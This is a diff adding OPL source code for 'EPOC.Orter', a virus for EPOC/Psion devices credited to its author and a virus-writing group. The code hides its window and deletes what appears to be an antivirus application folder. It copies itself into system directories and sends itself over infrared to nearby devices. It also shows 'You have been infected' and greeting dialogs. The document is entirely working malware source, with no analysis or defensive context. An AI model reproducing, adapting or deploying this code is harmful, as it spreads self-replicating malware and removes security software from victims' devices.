@@ -1,0 +1,60 @@
+/*   EPOC.Orter by Retro
+     http:retro.host.sk
+     www.indovirus.net   */
+		 
+APP Orter,666
+ENDA
+
+PROC Main:
+
+	GLOBAL file$(255), statusW&
+	file$ = "Orter.app"
+
+	gVISIBLE OFF
+	IF EXIST ("C:\System\Orter\")
+	   dINIT "Epoc.Orter"
+           dTEXT "","You have been infected"
+           dBUTTONS "OK", %O | $100
+	   RETURN DIALOG = %Y
+	ELSE
+	Retro:
+	Infect:
+	SendI:
+	Payload:
+	ENDIF
+ENDP
+
+PROC Payload:
+	dINIT "Epoc.Orter by Retro"
+	dTEXT "","http://retro.host.sk" ,$202
+	dTEXT "","Shouts go out to indovirus.net, Iwing",2
+	dTEXT "","Kefi, cpu_wizad and magstr2003",$202
+	dBUTTONS "OK", %O | $100
+	RETURN DIALOG=%O
+ENDP
+
+PROC Retro:
+	IF EXIST ("C:\System\Apps\PcciEpoc\")
+	   DELETE "C:\System\Apps\PcciEpoc\*"
+	   RMDIR "C:\System\Apps\PcciEpoc\"
+	ELSE
+	ENDIF
+ENDP
+
+PROC Infect:
+	ONERR Next::
+	MKDIR "C:\System\Orter\"
+	COPY "Orter.app","C:\System\Orter\"
+	COPY "Orter.app","C:\System\Temp\"
+	Next::
+ENDP
+
+PROC SendI:
+	IRDACONNECTTOSEND&:(KItTinyTP$,8)
+	IRDAWRITE:(file$, statusW&)
+	IF statusW& = 0
+	   IRDADISSCONECT:
+	ELSE
+	   STOP
+	ENDIF
+ENDP
